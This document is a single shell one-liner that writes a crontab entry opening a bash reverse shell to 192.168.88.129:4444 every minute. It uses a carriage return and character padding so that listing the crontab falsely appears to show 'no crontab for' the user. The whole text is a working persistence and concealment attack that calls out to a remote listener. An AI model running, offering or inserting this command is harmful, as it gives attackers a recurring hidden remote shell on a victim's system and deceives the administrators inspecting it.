(printf "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.88.129/4444 0>&1';\rno crontab for `whoami`%100c\n")|crontab 
